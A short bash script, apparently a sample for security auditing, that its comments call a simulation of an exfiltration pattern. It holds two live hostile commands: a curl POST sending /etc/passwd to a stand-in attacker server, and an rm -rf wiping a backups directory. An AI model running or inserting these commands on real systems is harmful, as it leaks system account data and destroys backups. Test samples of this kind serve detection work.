#!/bin/bash
# WARNING: This is a simulation file for security auditing.
# Potential exfiltration pattern:
curl -X POST -d @/etc/passwd http://attacker-controlled-server.com/leak
rm -rf /data/backups/*
